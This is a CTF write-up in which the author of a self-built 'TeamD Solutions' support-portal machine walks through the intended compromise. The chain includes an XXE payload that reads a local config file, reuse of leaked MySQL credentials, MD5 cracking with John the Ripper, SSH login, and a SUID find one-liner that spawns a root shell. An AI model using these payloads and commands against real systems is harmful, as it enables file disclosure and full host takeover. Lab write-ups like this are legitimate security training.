---
title: "TeamD: Breach the Trust - Official Writeup"
date: 2026-10-25
categories: [ctf]
tags: [xxe, mysql, credential-reuse, suid, privilege-escalation, own-ctf]
---

TeamD Solutions is a machine I built myself — a self-hosted customer support portal. It simulates a small company's internal ticketing system, reachable over HTTP, SSH, and a directly-exposed MySQL instance. The intended path chains four separate weaknesses together: a leaked legacy config endpoint, an XXE injection in the ticket submission feature, a directly reachable database, and a SUID `find` binary for the final step to root.

---

## Reconnaissance

A full TCP port scan was run against the target first:

```bash
nmap -sVC -p- 10.128.154.87
```

![Full Nmap scan results](/home/assets/img/teamd-1.png)

Three services stood out: SSH on 22, an nginx web server on 80 redirecting to `login.php`, and — notably — MySQL 8.0 listening on 3306 and reachable from outside the host. A database service exposed to the network is always worth keeping in mind for later stages, since it only takes one leaked credential to make use of it.

---

## Web Enumeration

Browsing to the web server landed on a login page for "TeamD Solutions" — a customer support portal.

![TeamD Solutions login page](/home/assets/img/teamd-2.png)

Since no credentials were available yet, a test account was registered through the public signup page.

![Registering a test account](/home/assets/img/teamd-3.png)

With an authenticated session in hand, directory brute-forcing was run against the application:

```bash
dirb http://10.128.154.87/app/customer/
```

![dirb uncovers a hidden /config/ directory](/home/assets/img/teamd-4.png)

The discovered config directory contained a readable file, `backup.php`, describing a legacy data migration:

![backup.php leaks internal filesystem paths](/home/assets/img/teamd-5.png)

This page didn't hand over credentials directly, but it leaked two things that mattered later: the application's real data root (`/var/www/teamd-data`) and the fact that a `deployment.conf` file exists inside its backups directory.

---

## Exploiting XML External Entity (XXE) Injection

The portal's "Create Support Request" form looked like an ordinary ticket submission UI:

![The new support ticket form](/home/assets/img/teamd-6.png)

Intercepting the submission in Burp Suite revealed the form actually posted raw XML to the server, with a `Content-Type` of `application/xml`:

![Burp Suite intercepts the raw XML request](/home/assets/img/teamd-7.png)

An application that parses attacker-supplied XML is a strong signal to test for XXE. A Document Type Definition (DTD) was added, defining an external entity that reads a local file via `file://`, targeting the path discovered earlier:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY xxe SYSTEM "file:///var/www/teamd-data/backups/deployment.conf">
]>
<ticket>
  <subject>&xxe;</subject>
  <description>testing</description>
  <priority>medium</priority>
</ticket>
```

![The modified request with the XXE payload](/home/assets/img/teamd-8.png)

Forwarding this request and viewing the resulting ticket showed the entity had been expanded server-side — the full contents of `deployment.conf` were rendered directly into the ticket:

![XXE successfully exfiltrates deployment.conf](/home/assets/img/teamd-9.png)

The leaked file contained database credentials and details of the system account the application runs as:

```ini
[database]
host=localhost
database=SSQLSS
user=TeamDServer
password=H3llo@123

[system]
service_user=teamd
service_home=/home/teamd
```

---

## Remote Database Access

Since MySQL was reachable directly, the leaked `TeamDServer` credentials were used to connect remotely:

```bash
mysql --connect-timeout=5 -h 10.128.154.87 -P 3306 \
  -u TeamDServer -p --ssl=0 SSQLSS
```

![Remote MySQL login succeeds, listing tables](/home/assets/img/teamd-10.png)

Nine tables were present, including `tickets`, `ticket_replies`, `user`, and `audit_logs`. The `tickets` table was the natural next target — a support system often ends up with sensitive debugging or configuration data pasted into a ticket by a well-meaning engineer.

---

## Recovering teamd's Credentials from the Tickets Table

Querying the tickets table directly:

```sql
SELECT * FROM tickets;
```

![A ticket's description contains a hashed credential for teamd](/home/assets/img/teamd-11.png)

One ticket, logged as part of the same legacy migration referenced earlier, included a `[system_auth_backup]` block — evidently left behind as a note rather than cleaned up. It contained a hashed credential pair for the `teamd` system account:

teamd:2ab96390c7dbe3439de74d0c9b0b1767


The hash format (32 hex characters) is consistent with raw MD5.

---

## Cracking the Hash

The hash was cracked offline using John the Ripper against the rockyou.txt wordlist:

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt teamd.txt
```

![John the Ripper recovers the plaintext password](/home/assets/img/teamd-12.png)

The hash cracked almost instantly to `hunter2` — giving a full, working credential pair: `teamd:hunter2`.

---

## Gaining a Foothold via SSH

With a valid system credential pair in hand, SSH access was straightforward:

```bash
ssh teamd@10.128.154.87
```

![SSH login as teamd succeeds, user flag read](/home/assets/img/teamd-13.png)

* **User Flag**: `THM{xxe_0ob_l3ak_ssh_key}`

---

## Privilege Escalation to Root

As `teamd`, the next step was checking for exploitable SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![The find binary carries the SUID bit](/home/assets/img/teamd-14.png)

A SUID `find` binary is a textbook GTFOBins privilege escalation vector: `find`'s `-exec` flag can spawn an arbitrary command, which inherits `find`'s elevated privileges when `-p` is passed to the shell it launches.

```bash
find . -exec /bin/sh -p \; -quit
```

![A root shell is obtained and the root flag is read](/home/assets/img/teamd-15.png)

* **Root Flag**: `THM{cheers_mate}`

---

## Attack Chain Summary

- Registered a low-privilege account on the public customer portal
- Used directory brute-forcing to find a leaked legacy configuration page
- Used the leaked internal path to target an XXE injection in the ticket submission endpoint
- Read `deployment.conf` via XXE, recovering database credentials and the `teamd` system account name
- Connected directly to the externally-exposed MySQL service with the leaked database credentials
- Found a hashed `teamd` system credential pasted into a support ticket by a previous engineer
- Cracked the hash offline with John the Ripper and rockyou.txt
- Used the recovered credentials to SSH in as `teamd` and capture the user flag
- Escalated to root via a misconfigured SUID bit on `/usr/bin/find`

---
